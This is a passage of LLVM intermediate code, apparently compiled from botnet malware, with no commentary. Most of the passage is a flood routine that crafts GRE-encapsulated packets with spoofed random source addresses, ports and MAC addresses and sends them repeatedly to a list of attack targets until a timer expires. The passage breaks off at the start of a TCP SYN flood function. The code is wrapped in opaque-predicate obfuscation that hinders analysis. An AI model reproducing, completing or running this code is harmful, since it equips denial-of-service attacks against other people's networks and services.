; <label>:292:                                    ; preds = %284, %278
  %293 = load i16, i16* %18, align 2
  %294 = call zeroext i16 @htons(i16 zeroext %293) #7
  %295 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %296 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %295, i32 0, i32 0
  store i16 %294, i16* %296, align 2
  %297 = load i16, i16* %19, align 2
  %298 = call zeroext i16 @htons(i16 zeroext %297) #7
  %299 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %300 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %299, i32 0, i32 1
  store i16 %298, i16* %300, align 2
  %301 = load i32, i32* %20, align 4
  %302 = sext i32 %301 to i64
  %303 = add i64 8, %302
  %304 = trunc i64 %303 to i16
  %305 = call zeroext i16 @htons(i16 zeroext %304) #7
  %306 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %307 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %306, i32 0, i32 2
  store i16 %305, i16* %307, align 2
  br label %308

; <label>:308:                                    ; preds = %292
  %309 = load i32, i32* %11, align 4
  %310 = add nsw i32 %309, 1
  store i32 %310, i32* %11, align 4
  br label %152

; <label>:311:                                    ; preds = %152
  br label %312

; <label>:312:                                    ; preds = %originalBBpart240, %311
  store i32 0, i32* %11, align 4
  br label %313

; <label>:313:                                    ; preds = %624, %312
  %314 = load i32, i32* %11, align 4
  %315 = load i8, i8* %7, align 1
  %316 = zext i8 %315 to i32
  %317 = icmp slt i32 %314, %316
  br i1 %317, label %318, label %627

; <label>:318:                                    ; preds = %313
  %319 = load i32, i32* @x.19
  %320 = load i32, i32* @y.20
  %321 = sub i32 %319, 1
  %322 = mul i32 %319, %321
  %323 = urem i32 %322, 2
  %324 = icmp eq i32 %323, 0
  %325 = icmp slt i32 %320, 10
  %326 = or i1 %324, %325
  br i1 %326, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %318
  %327 = load i8**, i8*** %13, align 8
  %328 = load i32, i32* %11, align 4
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds i8*, i8** %327, i64 %329
  %331 = load i8*, i8** %330, align 8
  store i8* %331, i8** %33, align 8
  %332 = load i8*, i8** %33, align 8
  %333 = bitcast i8* %332 to %struct.iphdr*
  store %struct.iphdr* %333, %struct.iphdr** %34, align 8
  %334 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %335 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %334, i64 1
  %336 = bitcast %struct.iphdr* %335 to %struct.grehdr*
  store %struct.grehdr* %336, %struct.grehdr** %35, align 8
  %337 = load %struct.grehdr*, %struct.grehdr** %35, align 8
  %338 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %337, i64 1
  %339 = bitcast %struct.grehdr* %338 to %struct.ethhdr*
  store %struct.ethhdr* %339, %struct.ethhdr** %36, align 8
  %340 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %341 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %340, i64 1
  %342 = bitcast %struct.ethhdr* %341 to %struct.iphdr*
  store %struct.iphdr* %342, %struct.iphdr** %37, align 8
  %343 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %344 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %343, i64 1
  %345 = bitcast %struct.iphdr* %344 to %struct.udphdr*
  store %struct.udphdr* %345, %struct.udphdr** %38, align 8
  %346 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %347 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %346, i64 1
  %348 = bitcast %struct.udphdr* %347 to i8*
  store i8* %348, i8** %39, align 8
  %349 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %350 = load i32, i32* %11, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %349, i64 %351
  %353 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %352, i32 0, i32 2
  %354 = load i8, i8* %353, align 4
  %355 = zext i8 %354 to i32
  %356 = icmp slt i32 %355, 32
  %357 = load i32, i32* @x.19
  %358 = load i32, i32* @y.20
  %359 = sub i32 %357, 1
  %360 = mul i32 %357, %359
  %361 = urem i32 %360, 2
  %362 = icmp eq i32 %361, 0
  %363 = icmp slt i32 %358, 10
  %364 = or i1 %362, %363
  br i1 %364, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %356, label %365, label %386

; <label>:365:                                    ; preds = %originalBBpart212
  %366 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %367 = load i32, i32* %11, align 4
  %368 = sext i32 %367 to i64
  %369 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %366, i64 %368
  %370 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %369, i32 0, i32 1
  %371 = load i32, i32* %370, align 4
  %372 = call i32 @ntohl(i32 %371) #7
  %373 = call i32 @rand_next()
  %374 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %375 = load i32, i32* %11, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %374, i64 %376
  %378 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %377, i32 0, i32 2
  %379 = load i8, i8* %378, align 4
  %380 = zext i8 %379 to i32
  %381 = lshr i32 %373, %380
  %382 = add i32 %372, %381
  %383 = call i32 @htonl(i32 %382) #7
  %384 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %385 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %384, i32 0, i32 9
  store i32 %383, i32* %385, align 4
  br label %386

; <label>:386:                                    ; preds = %365, %originalBBpart212
  %387 = load i32, i32* %23, align 4
  %388 = icmp eq i32 %387, -1
  br i1 %388, label %389, label %393

; <label>:389:                                    ; preds = %386
  %390 = call i32 @rand_next()
  %391 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %392 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %391, i32 0, i32 8
  store i32 %390, i32* %392, align 4
  br label %393

; <label>:393:                                    ; preds = %389, %386
  %394 = load i32, i32* @x.19
  %395 = load i32, i32* @y.20
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %393
  %402 = load i16, i16* %15, align 2
  %403 = zext i16 %402 to i32
  %404 = icmp eq i32 %403, 65535
  %405 = load i32, i32* @x.19
  %406 = load i32, i32* @y.20
  %407 = sub i32 %405, 1
  %408 = mul i32 %405, %407
  %409 = urem i32 %408, 2
  %410 = icmp eq i32 %409, 0
  %411 = icmp slt i32 %406, 10
  %412 = or i1 %410, %411
  br i1 %412, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %404, label %413, label %428

; <label>:413:                                    ; preds = %originalBBpart216
  %414 = call i32 @rand_next()
  %415 = and i32 %414, 65535
  %416 = trunc i32 %415 to i16
  %417 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %418 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %417, i32 0, i32 3
  store i16 %416, i16* %418, align 4
  %419 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i32 0, i32 3
  %421 = load i16, i16* %420, align 4
  %422 = zext i16 %421 to i32
  %423 = sub nsw i32 %422, 1000
  %424 = xor i32 %423, -1
  %425 = trunc i32 %424 to i16
  %426 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %427 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %426, i32 0, i32 3
  store i16 %425, i16* %427, align 4
  br label %428

; <label>:428:                                    ; preds = %413, %originalBBpart216
  %429 = load i16, i16* %18, align 2
  %430 = zext i16 %429 to i32
  %431 = icmp eq i32 %430, 65535
  br i1 %431, label %432, label %454

; <label>:432:                                    ; preds = %428
  %433 = load i32, i32* @x.19
  %434 = load i32, i32* @y.20
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %432
  %441 = call i32 @rand_next()
  %442 = and i32 %441, 65535
  %443 = trunc i32 %442 to i16
  %444 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %445 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %444, i32 0, i32 0
  store i16 %443, i16* %445, align 2
  %446 = load i32, i32* @x.19
  %447 = load i32, i32* @y.20
  %448 = sub i32 %446, 1
  %449 = mul i32 %446, %448
  %450 = urem i32 %449, 2
  %451 = icmp eq i32 %450, 0
  %452 = icmp slt i32 %447, 10
  %453 = or i1 %451, %452
  br i1 %453, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %454

; <label>:454:                                    ; preds = %originalBBpart220, %428
  %455 = load i16, i16* %19, align 2
  %456 = zext i16 %455 to i32
  %457 = icmp eq i32 %456, 65535
  br i1 %457, label %458, label %464

; <label>:458:                                    ; preds = %454
  %459 = call i32 @rand_next()
  %460 = and i32 %459, 65535
  %461 = trunc i32 %460 to i16
  %462 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %463 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %462, i32 0, i32 1
  store i16 %461, i16* %463, align 2
  br label %464

; <label>:464:                                    ; preds = %458, %454
  %465 = load i8, i8* %22, align 1
  %466 = icmp ne i8 %465, 0
  br i1 %466, label %471, label %467

; <label>:467:                                    ; preds = %464
  %468 = call i32 @rand_next()
  %469 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %470 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %469, i32 0, i32 9
  store i32 %468, i32* %470, align 4
  br label %493

; <label>:471:                                    ; preds = %464
  %472 = load i32, i32* @x.19
  %473 = load i32, i32* @y.20
  %474 = sub i32 %472, 1
  %475 = mul i32 %472, %474
  %476 = urem i32 %475, 2
  %477 = icmp eq i32 %476, 0
  %478 = icmp slt i32 %473, 10
  %479 = or i1 %477, %478
  br i1 %479, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %471
  %480 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %481 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %480, i32 0, i32 9
  %482 = load i32, i32* %481, align 4
  %483 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %484 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %483, i32 0, i32 9
  store i32 %482, i32* %484, align 4
  %485 = load i32, i32* @x.19
  %486 = load i32, i32* @y.20
  %487 = sub i32 %485, 1
  %488 = mul i32 %485, %487
  %489 = urem i32 %488, 2
  %490 = icmp eq i32 %489, 0
  %491 = icmp slt i32 %486, 10
  %492 = or i1 %490, %491
  br i1 %492, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %493

; <label>:493:                                    ; preds = %originalBBpart224, %467
  %494 = load i32, i32* @x.19
  %495 = load i32, i32* @y.20
  %496 = sub i32 %494, 1
  %497 = mul i32 %494, %496
  %498 = urem i32 %497, 2
  %499 = icmp eq i32 %498, 0
  %500 = icmp slt i32 %495, 10
  %501 = or i1 %499, %500
  br i1 %501, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %493
  %502 = call i32 @rand_next()
  store i32 %502, i32* %40, align 4
  %503 = call i32 @rand_next()
  store i32 %503, i32* %41, align 4
  %504 = call i32 @rand_next()
  store i32 %504, i32* %42, align 4
  %505 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %506 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %505, i32 0, i32 0
  %507 = getelementptr inbounds [6 x i8], [6 x i8]* %506, i32 0, i32 0
  %508 = bitcast i32* %40 to i8*
  call void @util_memcpy(i8* %507, i8* %508, i32 4)
  %509 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %510 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %509, i32 0, i32 1
  %511 = getelementptr inbounds [6 x i8], [6 x i8]* %510, i32 0, i32 0
  %512 = bitcast i32* %41 to i8*
  call void @util_memcpy(i8* %511, i8* %512, i32 4)
  %513 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %514 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %513, i32 0, i32 0
  %515 = getelementptr inbounds [6 x i8], [6 x i8]* %514, i32 0, i32 0
  %516 = getelementptr inbounds i8, i8* %515, i64 4
  %517 = bitcast i32* %42 to i8*
  call void @util_memcpy(i8* %516, i8* %517, i32 2)
  %518 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %519 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %518, i32 0, i32 1
  %520 = getelementptr inbounds [6 x i8], [6 x i8]* %519, i32 0, i32 0
  %521 = getelementptr inbounds i8, i8* %520, i64 4
  %522 = bitcast i32* %42 to i8*
  %523 = getelementptr inbounds i8, i8* %522, i64 2
  call void @util_memcpy(i8* %521, i8* %523, i32 2)
  %524 = load i8, i8* %21, align 1
  %525 = icmp ne i8 %524, 0
  %526 = load i32, i32* @x.19
  %527 = load i32, i32* @y.20
  %528 = sub i32 %526, 1
  %529 = mul i32 %526, %528
  %530 = urem i32 %529, 2
  %531 = icmp eq i32 %530, 0
  %532 = icmp slt i32 %527, 10
  %533 = or i1 %531, %532
  br i1 %533, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %525, label %534, label %557

; <label>:534:                                    ; preds = %originalBBpart228
  %535 = load i32, i32* @x.19
  %536 = load i32, i32* @y.20
  %537 = sub i32 %535, 1
  %538 = mul i32 %535, %537
  %539 = urem i32 %538, 2
  %540 = icmp eq i32 %539, 0
  %541 = icmp slt i32 %536, 10
  %542 = or i1 %540, %541
  br i1 %542, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %534
  %543 = load i8*, i8** %39, align 8
  %544 = load i32, i32* %20, align 4
  call void @rand_alpha_str(i8* %543, i32 %544)
  %545 = load i8*, i8** %39, align 8
  %546 = load i32, i32* %20, align 4
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds i8, i8* %545, i64 %547
  store i8 0, i8* %548, align 1
  %549 = load i32, i32* @x.19
  %550 = load i32, i32* @y.20
  %551 = sub i32 %549, 1
  %552 = mul i32 %549, %551
  %553 = urem i32 %552, 2
  %554 = icmp eq i32 %553, 0
  %555 = icmp slt i32 %550, 10
  %556 = or i1 %554, %555
  br i1 %556, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %557

; <label>:557:                                    ; preds = %originalBBpart232, %originalBBpart228
  %558 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %559 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %558, i32 0, i32 7
  store i16 0, i16* %559, align 2
  %560 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %561 = bitcast %struct.iphdr* %560 to i16*
  %562 = call zeroext i16 @checksum_generic(i16* %561, i32 20)
  %563 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %564 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %563, i32 0, i32 7
  store i16 %562, i16* %564, align 2
  %565 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %566 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %565, i32 0, i32 7
  store i16 0, i16* %566, align 2
  %567 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %568 = bitcast %struct.iphdr* %567 to i16*
  %569 = call zeroext i16 @checksum_generic(i16* %568, i32 20)
  %570 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %571 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %570, i32 0, i32 7
  store i16 %569, i16* %571, align 2
  %572 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %573 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %572, i32 0, i32 3
  store i16 0, i16* %573, align 2
  %574 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %575 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %576 = bitcast %struct.udphdr* %575 to i8*
  %577 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %578 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %577, i32 0, i32 2
  %579 = load i16, i16* %578, align 2
  %580 = load i32, i32* %20, align 4
  %581 = sext i32 %580 to i64
  %582 = add i64 8, %581
  %583 = trunc i64 %582 to i32
  %584 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %574, i8* %576, i16 zeroext %579, i32 %583)
  %585 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %586 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %585, i32 0, i32 3
  store i16 %584, i16* %586, align 2
  %587 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %588 = load i32, i32* %11, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %587, i64 %589
  %591 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %590, i32 0, i32 0
  %592 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %591, i32 0, i32 0
  store i16 2, i16* %592, align 4
  %593 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %594 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %593, i32 0, i32 9
  %595 = load i32, i32* %594, align 4
  %596 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %597 = load i32, i32* %11, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %596, i64 %598
  %600 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %599, i32 0, i32 0
  %601 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %600, i32 0, i32 2
  %602 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %601, i32 0, i32 0
  store i32 %595, i32* %602, align 4
  %603 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %604 = load i32, i32* %11, align 4
  %605 = sext i32 %604 to i64
  %606 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %603, i64 %605
  %607 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %606, i32 0, i32 0
  %608 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %607, i32 0, i32 1
  store i16 0, i16* %608, align 2
  %609 = load i32, i32* %12, align 4
  %610 = load i8*, i8** %33, align 8
  %611 = load i32, i32* %20, align 4
  %612 = sext i32 %611 to i64
  %613 = add i64 66, %612
  %614 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %615 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %616 = load i32, i32* %11, align 4
  %617 = sext i32 %616 to i64
  %618 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %615, i64 %617
  %619 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %618, i32 0, i32 0
  %620 = bitcast %struct.sockaddr_in* %619 to %struct.sockaddr*
  store %struct.sockaddr* %620, %struct.sockaddr** %614, align 8
  %621 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %622 = load %struct.sockaddr*, %struct.sockaddr** %621, align 8
  %623 = call i64 @sendto(i32 %609, i8* %610, i64 %613, i32 16384, %struct.sockaddr* %622, i32 16)
  br label %624

; <label>:624:                                    ; preds = %557
  %625 = load i32, i32* %11, align 4
  %626 = add nsw i32 %625, 1
  store i32 %626, i32* %11, align 4
  br label %313

; <label>:627:                                    ; preds = %313
  %628 = load i32, i32* @x.19
  %629 = load i32, i32* @y.20
  %630 = sub i32 %628, 1
  %631 = mul i32 %628, %630
  %632 = urem i32 %631, 2
  %633 = icmp eq i32 %632, 0
  %634 = icmp slt i32 %629, 10
  %635 = or i1 %633, %634
  br i1 %635, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %627
  %636 = call i64 @time(i64* null) #6
  %637 = load i32, i32* %24, align 4
  %638 = sext i32 %637 to i64
  %639 = icmp sgt i64 %636, %638
  %640 = load i32, i32* @x.19
  %641 = load i32, i32* @y.20
  %642 = sub i32 %640, 1
  %643 = mul i32 %640, %642
  %644 = urem i32 %643, 2
  %645 = icmp eq i32 %644, 0
  %646 = icmp slt i32 %641, 10
  %647 = or i1 %645, %646
  br i1 %647, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %639, label %648, label %649

; <label>:648:                                    ; preds = %originalBBpart236
  br label %666

; <label>:649:                                    ; preds = %originalBBpart236
  %650 = load i32, i32* @x.19
  %651 = load i32, i32* @y.20
  %652 = sub i32 %650, 1
  %653 = mul i32 %650, %652
  %654 = urem i32 %653, 2
  %655 = icmp eq i32 %654, 0
  %656 = icmp slt i32 %651, 10
  %657 = or i1 %655, %656
  br i1 %657, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %649
  %658 = load i32, i32* @x.19
  %659 = load i32, i32* @y.20
  %660 = sub i32 %658, 1
  %661 = mul i32 %658, %660
  %662 = urem i32 %661, 2
  %663 = icmp eq i32 %662, 0
  %664 = icmp slt i32 %659, 10
  %665 = or i1 %663, %664
  br i1 %665, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %312

; <label>:666:                                    ; preds = %648, %originalBBpart24, %originalBBpart2
  %667 = load i32, i32* @x.19
  %668 = load i32, i32* @y.20
  %669 = sub i32 %667, 1
  %670 = mul i32 %667, %669
  %671 = urem i32 %670, 2
  %672 = icmp eq i32 %671, 0
  %673 = icmp slt i32 %668, 10
  %674 = or i1 %672, %673
  br i1 %674, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %666
  %675 = load i32, i32* @x.19
  %676 = load i32, i32* @y.20
  %677 = sub i32 %675, 1
  %678 = mul i32 %675, %677
  %679 = urem i32 %678, 2
  %680 = icmp eq i32 %679, 0
  %681 = icmp slt i32 %676, 10
  %682 = or i1 %680, %681
  br i1 %682, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %94
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %116
  %683 = load i32, i32* %12, align 4
  %684 = call i32 @close(i32 %683)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %135
  store i32 0, i32* %11, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %318
  %685 = load i8**, i8*** %13, align 8
  %686 = load i32, i32* %11, align 4
  %687 = sext i32 %686 to i64
  %688 = getelementptr inbounds i8*, i8** %685, i64 %687
  %689 = load i8*, i8** %688, align 8
  store i8* %689, i8** %33, align 8
  %690 = load i8*, i8** %33, align 8
  %691 = bitcast i8* %690 to %struct.iphdr*
  store %struct.iphdr* %691, %struct.iphdr** %34, align 8
  %692 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %693 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %692, i64 1
  %694 = bitcast %struct.iphdr* %693 to %struct.grehdr*
  store %struct.grehdr* %694, %struct.grehdr** %35, align 8
  %695 = load %struct.grehdr*, %struct.grehdr** %35, align 8
  %696 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %695, i64 1
  %697 = bitcast %struct.grehdr* %696 to %struct.ethhdr*
  store %struct.ethhdr* %697, %struct.ethhdr** %36, align 8
  %698 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %699 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %698, i64 1
  %700 = bitcast %struct.ethhdr* %699 to %struct.iphdr*
  store %struct.iphdr* %700, %struct.iphdr** %37, align 8
  %701 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %702 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %701, i64 1
  %703 = bitcast %struct.iphdr* %702 to %struct.udphdr*
  store %struct.udphdr* %703, %struct.udphdr** %38, align 8
  %704 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %705 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %704, i64 1
  %706 = bitcast %struct.udphdr* %705 to i8*
  store i8* %706, i8** %39, align 8
  %707 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %708 = load i32, i32* %11, align 4
  %709 = sext i32 %708 to i64
  %710 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %707, i64 %709
  %711 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %710, i32 0, i32 2
  %712 = load i8, i8* %711, align 4
  %713 = zext i8 %712 to i32
  %714 = icmp slt i32 %713, 32
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %393
  %715 = load i16, i16* %15, align 2
  %716 = zext i16 %715 to i32
  %717 = icmp eq i32 %716, 65535
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %432
  %718 = call i32 @rand_next()
  %_ = sub i32 0, %718
  %gen = add i32 %_, 65535
  %719 = and i32 %718, 65535
  %720 = trunc i32 %719 to i16
  %721 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %722 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %721, i32 0, i32 0
  store i16 %720, i16* %722, align 2
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %471
  %723 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %724 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %723, i32 0, i32 9
  %725 = load i32, i32* %724, align 4
  %726 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %727 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %726, i32 0, i32 9
  store i32 %725, i32* %727, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %493
  %728 = call i32 @rand_next()
  store i32 %728, i32* %40, align 4
  %729 = call i32 @rand_next()
  store i32 %729, i32* %41, align 4
  %730 = call i32 @rand_next()
  store i32 %730, i32* %42, align 4
  %731 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %732 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %731, i32 0, i32 0
  %733 = getelementptr inbounds [6 x i8], [6 x i8]* %732, i32 0, i32 0
  %734 = bitcast i32* %40 to i8*
  call void @util_memcpy(i8* %733, i8* %734, i32 4)
  %735 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %736 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %735, i32 0, i32 1
  %737 = getelementptr inbounds [6 x i8], [6 x i8]* %736, i32 0, i32 0
  %738 = bitcast i32* %41 to i8*
  call void @util_memcpy(i8* %737, i8* %738, i32 4)
  %739 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %740 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %739, i32 0, i32 0
  %741 = getelementptr inbounds [6 x i8], [6 x i8]* %740, i32 0, i32 0
  %742 = getelementptr inbounds i8, i8* %741, i64 4
  %743 = bitcast i32* %42 to i8*
  call void @util_memcpy(i8* %742, i8* %743, i32 2)
  %744 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %745 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %744, i32 0, i32 1
  %746 = getelementptr inbounds [6 x i8], [6 x i8]* %745, i32 0, i32 0
  %747 = getelementptr inbounds i8, i8* %746, i64 4
  %748 = bitcast i32* %42 to i8*
  %749 = getelementptr inbounds i8, i8* %748, i64 2
  call void @util_memcpy(i8* %747, i8* %749, i32 2)
  %750 = load i8, i8* %21, align 1
  %751 = icmp ne i8 %750, 0
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %534
  %752 = load i8*, i8** %39, align 8
  %753 = load i32, i32* %20, align 4
  call void @rand_alpha_str(i8* %752, i32 %753)
  %754 = load i8*, i8** %39, align 8
  %755 = load i32, i32* %20, align 4
  %756 = sext i32 %755 to i64
  %757 = getelementptr inbounds i8, i8* %754, i64 %756
  store i8 0, i8* %757, align 1
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %627
  %758 = call i64 @time(i64* null) #6
  %759 = load i32, i32* %24, align 4
  %760 = sext i32 %759 to i64
  %761 = icmp sgt i64 %758, %760
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %649
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %666
  br label %originalBB42
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
